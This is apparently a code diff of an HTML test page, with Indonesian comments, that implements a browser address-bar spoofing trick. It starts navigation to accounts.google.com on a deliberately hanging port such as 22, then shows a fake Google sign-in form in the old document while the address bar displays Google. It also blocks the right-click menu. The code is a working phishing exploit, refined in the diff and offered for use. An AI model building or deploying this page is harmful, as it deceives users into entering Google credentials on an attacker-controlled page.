@@ -6,56 +6,37 @@
 <title>Halaman Uji</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { width: 100%; height: 100%; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
-
-  /* ===== Halaman 1: polos, click here ===== */
+  html, body { width: 100%; height: 100%; font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fafafa; }
   #landing {
-    height: 100%;
-    display: flex; align-items: center; justify-content: center;
-    background: #fafafa;
+    height: 100%; display: flex; align-items: center; justify-content: center;
   }
-  #landing a {
-    font-size: 20px; color: #1a73e8; text-decoration: underline; cursor: pointer;
-  }
+  #landing a { font-size: 20px; color: #1a73e8; text-decoration: underline; cursor: pointer; }
 
-  /* ===== Halaman 2: form palsu Google (muncul setelah klik) ===== */
-  #fake {
-    display: none;
-    height: 100%; background: #fff;
-    padding-top: 90px;
-  }
+  /* Form palsu, hidden sampai navigasi dimulai */
+  #fake { display: none; height: 100%; background: #fff; padding-top: 90px; }
   .card {
-    width: 448px; max-width: 92%;
-    margin: 0 auto;
-    border: 1px solid #dadce0; border-radius: 8px;
-    padding: 48px 40px;
+    width: 448px; max-width: 92%; margin: 0 auto;
+    border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px;
   }
   .logo { display: flex; justify-content: center; margin-bottom: 16px; }
   h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
   p.sub { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 32px; }
   .input {
-    width: 100%; height: 54px; border: 1px solid #dadce0;
-    border-radius: 4px; padding: 0 16px; font-size: 16px;
-    outline: none; margin-bottom: 16px;
+    width: 100%; height: 54px; border: 1px solid #dadce0; border-radius: 4px;
+    padding: 0 16px; font-size: 16px; outline: none; margin-bottom: 16px;
   }
-  .input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
   .row { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; }
   a.link { color: #1a73e8; font-size: 14px; text-decoration: none; }
   button.next {
-    background: #1a73e8; color: #fff; border: none;
-    padding: 10px 24px; border-radius: 4px; font-size: 14px;
-    font-weight: 500; cursor: pointer;
+    background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
+    border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
   }
 </style>
 </head>
 <body>
 
-  <!-- Halaman polos -->
-  <div id="landing">
-    <a id="go">Click here</a>
-  </div>
+  <div id="landing"><a id="go">Click here</a></div>
 
-  <!-- Form palsu: hidden, di-reveal saat klik -->
   <div id="fake">
     <div class="card">
       <div class="logo">
@@ -63,7 +44,7 @@
       </div>
       <h1>Masuk</h1>
       <p class="sub">Gunakan Akun Google Anda</p>
-      <input class="input" type="email" placeholder="Email atau ponsel" id="email" autofocus>
+      <input class="input" type="email" placeholder="Email atau ponsel">
       <a class="link" href="#">Lupa email?</a>
       <div class="row">
         <a class="link" href="#">Buat akun</a>
@@ -73,24 +54,20 @@
   </div>
 
 <script>
-  const TARGET = 'https://accounts.google.com:1234/v3/signin/identifier?flowName=GlifWebSignIn';
+  // WAJIB: port harus hang. Tes manual dulu di tab baru sampai ketemu
+  // port yang spinner-nya muter lama. Kandidat: 22, 25, 445, 6667.
+  const TARGET = 'https://accounts.google.com:22/v3/signin/identifier?flowName=GlifWebSignIn';
 
   document.getElementById('go').addEventListener('click', (e) => {
     e.preventDefault();
-
-    // 1. Mulai navigasi DULU — address bar langsung berubah ke accounts.google.com:1234
-    //    (karena port 1234 hang, halaman baru tidak akan selesai di-render,
-    //     sehingga dokumen lama ini tetap hidup dan tampil)
-    location.href = TARGET;
-
-    // 2. Segera setelah navigasi dimulai, swap konten ke form palsu.
-    //    Dokumen lama masih tampil selama loading, jadi user melihat
-    //    form "Google" padahal address bar sudah accounts.google.com:1234.
+    // 1. Navigasi mulai -> address bar berubah ke accounts.google.com:22
+    location.assign(TARGET);
+    // 2. Setelah navigasi pending, render form palsu di dokumen lama
+    //    (dokumen lama tetap hidup selama koneksi hang)
     setTimeout(() => {
       document.getElementById('landing').style.display = 'none';
       document.getElementById('fake').style.display = 'block';
-      document.getElementById('email').focus();
-    }, 50);
+    }, 30);
   });
 
   document.addEventListener('contextmenu', e => e.preventDefault());
